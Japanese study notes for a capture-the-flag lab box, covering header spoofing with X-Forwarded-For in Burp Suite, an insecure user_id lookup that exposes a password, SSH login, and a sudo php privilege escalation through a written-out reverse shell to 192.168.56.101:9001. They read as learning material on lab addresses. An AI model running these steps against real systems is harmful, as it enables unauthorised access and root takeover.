### 論点
- burpsuiteでheaderを書き換え


## 攻略
- nmap
  - 22,80
- webサイトを見る
  - サイトを見たら、localしか見れないと書いてある
  - view page sourceを見たら、x-forwarded-forをlocalにすると書いてある
- burpsuiteを起動する
  - いつものようにブラウザを起動してintercept onにしてリクエストの中身を見る。このヘッダーに`X-Forwarded-For:localhost`を書き込めばサイトを見ることができる
  - Requestのヘッダに直接書き込むこともできるが、間違うとダメなのでInterceptの一番右端にProxy settingsがあるので、ここなら丁寧に設定できるので押す
  - HTTP match and replaces rulesのところでAddを押す、フォームが開くのでReplaceのところに `X-Forwarded-For:localhost`と入力してok
  - ブラウザに戻って更新する
- サイトにユーザを登録する
  - Registerを選んで登録する 
  - profileを押すとURLのリンクを見るとuser_id=12となっている。これは登録されているユーザの番号と推測できる。本来なら全部をメモっておくが、ここでは面倒なので、URLのuser_id=5にする。これが答え。パスワードは見れないが、view source codeを見るとパスワードが見れる
  - user:alice,password:4lic3
  - ~使ったらburpのproxyのrequest headerのチェックを外しておく~ burpsuiteを消したら自動で消えるみたい
- aliceでsshをする
- suid
  - 特になし
- sudo -l
  - phpが使えるので、GTFOBinsで調べる。いくつかあるがreverse-shellをする
  - 次のはphpを使ったリバースシェルのだが、`~/tools/reverse-shell.txt`にあるのを下のに書き換える
    - `php -r '$sock=fsockopen("192.168.56.101","9001");exec("/bin/sh -i <&3 >&3 2>&3");'`
  
- rootになる
  - Parrotで待ち受ける `nc -nlvp 9001` 
  - `sudo php -r '$sock=fsockopen("192.168.56.101","9001");exec("/bin/sh -i <&3 >&3 2>&3");'`
  - (注意)次のでもrootになれる`sudo php -r 'system("/bin/bash -i");'`

## Requestの中身

### 課題
- headerのチェックのコードを見る

```
GET / HTTP/1.1
Host: 192.168.56.135
Cache-Control: max-age=0
Accept-Language: ja
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```


## Question
- network scanした時の192.168.56.1は何か？
- メインPCからサイト見る
- X-Forwarded-for:localhostを書き換える
- リクエストを大きく4つに分けると何か、各行は何か
- なぜ、他のユーザではsshできないか
- wordpressなどログインサイトがあったときに注意することは
